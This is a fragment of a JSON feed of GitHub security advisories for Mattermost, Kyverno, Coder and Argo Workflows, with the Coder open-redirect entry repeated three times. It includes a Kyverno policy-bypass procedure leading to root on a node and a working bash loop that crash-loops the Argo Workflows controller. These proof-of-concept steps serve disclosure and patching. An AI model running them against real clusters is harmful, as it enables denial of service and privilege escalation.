            "content_html": "<p>Mattermost versions 9.10.x &lt;= 9.10.2, 9.11.x &lt;= 9.11.1, 9.5.x &lt;= 9.5.9 fail to sanitize user inputs in the frontend that are used for redirection which allows for a one-click client-side path traversal that is leading to CSRF in Playbooks</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-46872\">https://nvd.nist.gov/vuln/detail/CVE-2024-46872</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-762g-9p7f-mrww\">https://github.com/advisories/GHSA-762g-9p7f-mrww</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-762g-9p7f-mrww",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Server Path Traversal vulnerability that leads to Cross-Site Request Forgery",
            "date_modified": "2024-10-29T16:13:08.000Z",
            "date_published": "2024-10-29T09:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-762g-9p7f-mrww"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 9.5.x &lt;= 9.5.9 fail to properly filter the channel data when ElasticSearch is enabled which allows a user to get&nbsp;private channel names by using cmd+K/ctrl+K.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10241\">https://nvd.nist.gov/vuln/detail/CVE-2024-10241</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6mvp-gh77-7vwh\">https://github.com/advisories/GHSA-6mvp-gh77-7vwh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6mvp-gh77-7vwh",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Server allows user to get private channel names",
            "date_modified": "2024-10-29T16:06:29.000Z",
            "date_published": "2024-10-29T09:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6mvp-gh77-7vwh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A kyverno ClusterPolicy, ie. \"disallow-privileged-containers,\" can be overridden by the creation of a PolicyException in a random namespace.</p>\n<h3 id=\"details\">Details</h3>\n<p>By design, PolicyExceptions are consumed from any namespace. Administrators may not recognize that this allows users with privileges to non-kyverno namespaces to create exceptions.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Administrator creates \"disallow-privileged-containers\" ClusterPolicy that applies to resources in the namespace \"ubuntu-restricted\"</li>\n<li>Cluster user creates a PolicyException object for \"disallow-privileged-containers\" in namespace \"ubuntu-restricted\"</li>\n<li>Cluster user creates a pod with a privileged container in \"ubuntu-restricted\" </li>\n<li>Cluster user escalates to root on the node from the privileged container</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>Administrators attempting to enforce cluster security through kyverno policies, but that allow less privileged users to create resources</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kyverno/kyverno/security/advisories/GHSA-qjvc-p88j-j9rm\">https://github.com/kyverno/kyverno/security/advisories/GHSA-qjvc-p88j-j9rm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-48921\">https://nvd.nist.gov/vuln/detail/CVE-2024-48921</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qjvc-p88j-j9rm\">https://github.com/advisories/GHSA-qjvc-p88j-j9rm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qjvc-p88j-j9rm",
            "title": "[github.com/kyverno/kyverno] Kyverno's PolicyException objects can be created in any namespace by default",
            "date_modified": "2024-10-29T20:00:13.000Z",
            "date_published": "2024-10-29T14:44:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qjvc-p88j-j9rm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 9.11.X &lt;= 9.11.1, 9.5.x &lt;= 9.5.9 incorrectly issues two sessions when using desktop SSO - one in the browser and one in desktop with incorrect settings.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10214\">https://nvd.nist.gov/vuln/detail/CVE-2024-10214</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/0d6b1070a26f0b9fc13f7e7fbbe18b6a31570c5a\">https://github.com/mattermost/mattermost/commit/0d6b1070a26f0b9fc13f7e7fbbe18b6a31570c5a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hm57-h27x-599c\">https://github.com/advisories/GHSA-hm57-h27x-599c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hm57-h27x-599c",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost incorrectly issues two sessions when using desktop SSO",
            "date_modified": "2024-10-30T18:50:53.000Z",
            "date_published": "2024-10-28T15:31:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hm57-h27x-599c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An issue on Coder's login page allows attackers to craft a Coder URL that when clicked by a logged in user could redirect them to a website the attacker controls, e.g. <a href=\"https://google.com\">https://google.com</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>On the login page, Coder checks for the presence of a <code>redirect</code> query parameter. On successful login, the user would be redirected to the location of the parameter. Improper sanitization allows attackers to specify a URL outside of the Coder application to redirect users to.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Coder users could potentially be redirected to a untrusted website if tricked into clicking a URL crafted by the attacker. Coder authentication tokens are <strong>not</strong> leaked to the resulting website.</p>\n<p>To check if your deployment is vulnerable, visit the following URL for your Coder deployment:</p>\n<ul>\n<li><code>https://&lt;coder url&gt;/login?redirect=https%3A%2F%2Fcoder.com%2Fdocs</code></li>\n</ul>\n<h3 id=\"patched-versions\">Patched Versions</h3>\n<p>This vulnerability is remedied in</p>\n<ul>\n<li>v2.16.1</li>\n<li>v2.15.3</li>\n<li>v2.14.4</li>\n</ul>\n<p>All versions prior to 2.3.1 are not affected.</p>\n<h3 id=\"thanks\">Thanks</h3>\n<ul>\n<li><a href=\"https://github.com/jchristov\">https://github.com/jchristov</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c</a>\n<a href=\"https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6\">https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c</a></li>\n<li><a href=\"https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6\">https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/advisories/GHSA-wcx9-ccpj-hx3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wcx9-ccpj-hx3c",
            "title": "[github.com/coder/coder/v2] Coder vulnerable to post-auth URL redirection to untrusted site ('Open Redirect')",
            "date_modified": "2024-10-28T18:31:58.000Z",
            "date_published": "2024-10-28T18:31:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wcx9-ccpj-hx3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An issue on Coder's login page allows attackers to craft a Coder URL that when clicked by a logged in user could redirect them to a website the attacker controls, e.g. <a href=\"https://google.com\">https://google.com</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>On the login page, Coder checks for the presence of a <code>redirect</code> query parameter. On successful login, the user would be redirected to the location of the parameter. Improper sanitization allows attackers to specify a URL outside of the Coder application to redirect users to.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Coder users could potentially be redirected to a untrusted website if tricked into clicking a URL crafted by the attacker. Coder authentication tokens are <strong>not</strong> leaked to the resulting website.</p>\n<p>To check if your deployment is vulnerable, visit the following URL for your Coder deployment:</p>\n<ul>\n<li><code>https://&lt;coder url&gt;/login?redirect=https%3A%2F%2Fcoder.com%2Fdocs</code></li>\n</ul>\n<h3 id=\"patched-versions\">Patched Versions</h3>\n<p>This vulnerability is remedied in</p>\n<ul>\n<li>v2.16.1</li>\n<li>v2.15.3</li>\n<li>v2.14.4</li>\n</ul>\n<p>All versions prior to 2.3.1 are not affected.</p>\n<h3 id=\"thanks\">Thanks</h3>\n<ul>\n<li><a href=\"https://github.com/jchristov\">https://github.com/jchristov</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c</a>\n<a href=\"https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6\">https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c</a></li>\n<li><a href=\"https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6\">https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/advisories/GHSA-wcx9-ccpj-hx3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wcx9-ccpj-hx3c",
            "title": "[github.com/coder/coder/v2] Coder vulnerable to post-auth URL redirection to untrusted site ('Open Redirect')",
            "date_modified": "2024-10-28T18:31:58.000Z",
            "date_published": "2024-10-28T18:31:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wcx9-ccpj-hx3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An issue on Coder's login page allows attackers to craft a Coder URL that when clicked by a logged in user could redirect them to a website the attacker controls, e.g. <a href=\"https://google.com\">https://google.com</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>On the login page, Coder checks for the presence of a <code>redirect</code> query parameter. On successful login, the user would be redirected to the location of the parameter. Improper sanitization allows attackers to specify a URL outside of the Coder application to redirect users to.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Coder users could potentially be redirected to a untrusted website if tricked into clicking a URL crafted by the attacker. Coder authentication tokens are <strong>not</strong> leaked to the resulting website.</p>\n<p>To check if your deployment is vulnerable, visit the following URL for your Coder deployment:</p>\n<ul>\n<li><code>https://&lt;coder url&gt;/login?redirect=https%3A%2F%2Fcoder.com%2Fdocs</code></li>\n</ul>\n<h3 id=\"patched-versions\">Patched Versions</h3>\n<p>This vulnerability is remedied in</p>\n<ul>\n<li>v2.16.1</li>\n<li>v2.15.3</li>\n<li>v2.14.4</li>\n</ul>\n<p>All versions prior to 2.3.1 are not affected.</p>\n<h3 id=\"thanks\">Thanks</h3>\n<ul>\n<li><a href=\"https://github.com/jchristov\">https://github.com/jchristov</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c</a>\n<a href=\"https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6\">https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/coder/coder/security/advisories/GHSA-wcx9-ccpj-hx3c</a></li>\n<li><a href=\"https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6\">https://github.com/coder/coder/commit/69c1d981e3131e50d52b01f6a360abadaad699e6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wcx9-ccpj-hx3c\">https://github.com/advisories/GHSA-wcx9-ccpj-hx3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wcx9-ccpj-hx3c",
            "title": "[github.com/coder/coder/v2] Coder vulnerable to post-auth URL redirection to untrusted site ('Open Redirect')",
            "date_modified": "2024-10-28T18:31:58.000Z",
            "date_published": "2024-10-28T18:31:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wcx9-ccpj-hx3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Due to a race condition in a global variable, the argo workflows controller can be made to crash on-command by any user with access to execute a workflow.</p>\n<p>This was resolved by <a href=\"https://github.com/argoproj/argo-workflows/pull/13641\">https://github.com/argoproj/argo-workflows/pull/13641</a></p>\n<h3 id=\"details\">Details</h3>\n<p>These two lines introduce a data race in the underlying SPDY implementation of the Kubernetes API client. If a second request is made before the first completes, it results in a panic due to a null pointer.</p>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L49\">https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L49</a></li>\n<li><a href=\"https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L75\">https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L75</a></li>\n</ul>\n<p>This appears to have been added in this commit <a href=\"https://github.com/argoproj/argo-workflows/commit/9756babd0ed589d1cd24592f05725f748f74130b\">https://github.com/argoproj/argo-workflows/commit/9756babd0ed589d1cd24592f05725f748f74130b</a> / #13265 / v3.6.0-rc1</p>\n<h3 id=\"poc\">PoC</h3>\n<p>With the <code>KUBECONFIG</code> variable set to an appropriate file with <code>create</code> permissions for the <code>Workflow</code> kind, execute the following bash script:</p>\n<pre><code class=\"language-bash\">#!/bin/bash -xeu\n\nwhile true ; do\n    name=$(\n        { argo submit /dev/stdin &lt;&lt;'EOF'\napiVersion: argoproj.io/v1alpha1\nkind: Workflow\nmetadata:\n  generateName: curl-\nspec:\n  entrypoint: main\n  templates:\n  - name: main\n    dag:\n      tasks:\n        - name: no-op\n          template: no-op\n          withSequence:\n            count: 3\n  - name: no-op\n    daemon: true\n    container:\n      image: alpine:3.13\n      command: [sleep, infinity]\nEOF\n    } | head -n1 | awk '{ print $2 }'\n    )\n    ( sleep 30; argo terminate $name ) &amp;\n    sleep 15\ndone\n</code></pre>\n<p>This script creates, and subsequently cleans up, multiple <code>daemon</code> pods in rapid succession. Each pod cleanup involves executing a <code>kill</code> instruction using the Kubernetes <code>exec</code> API, triggering the conditions for the panic. This can be seen when the tests mark the pods as complete, but the workflow itself never completes. Observing the controller logs when this happens shows the panic and restart of the controller every few seconds. In a setup with exponential backoff (e.g. a Kubernetes Pod) this is enough to reliably cause crashes enough to extend this backoff significantly and leave other workflows stalled.</p>\n<p>Because the restarted controller believes it has sent the <code>kill</code> signal, it will wait indefinitely for the pod to terminate, which it never will, so the attack must constantly garbage-collect its own workflows with the <code>argo terminate</code> command, otherwise the maximum concurrently running workflows will be reached. A more sophisticated attack could detect when the workflow has been signaled to clean up and terminate it then instead of relying on a simple timer.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A malicious user with access to create workflows can continually submit workflows that do nothing except create and then clean up multiple daemon pods, resulting in a crash-loop that prevents other users' workflows from running. This can be done with only a handful of pods and very little cpu and memory, meaning typical multi-tenant Kubernetes controls such as Pod count and resource quotas are not effective at preventing it.</p>\n<p>Because the panic log does not in any way suggest that the issue has anything to do with the daemon pods, and an attacker could easily disguise these daemon pods as part of a genuine workflow, it would be difficult for administrators to discover the root cause of the DoS and the individuals responsible to remove their access.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-workflows/security/advisories/GHSA-ghjw-32xw-ffwr\">https://github.com/argoproj/argo-workflows/security/advisories/GHSA-ghjw-32xw-ffwr</a></li>\n<li><a href=\"https://github.com/argoproj/argo-workflows/pull/13641\">https://github.com/argoproj/argo-workflows/pull/13641</a></li>\n<li><a href=\"https://github.com/argoproj/argo-workflows/commit/524406451f4dfa57bf3371fb85becdb56a2b309a\">https://github.com/argoproj/argo-workflows/commit/524406451f4dfa57bf3371fb85becdb56a2b309a</a></li>\n<li><a href=\"https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L75\">https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L75</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47827\">https://nvd.nist.gov/vuln/detail/CVE-2024-47827</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ghjw-32xw-ffwr\">https://github.com/advisories/GHSA-ghjw-32xw-ffwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ghjw-32xw-ffwr",
            "title": "[github.com/argoproj/argo-workflows/v3] Argo Workflows Controller: Denial of Service via malicious daemon Workflows",
            "date_modified": "2024-10-28T19:44:06.000Z",
            "date_published": "2024-10-28T18:28:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ghjw-32xw-ffwr"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}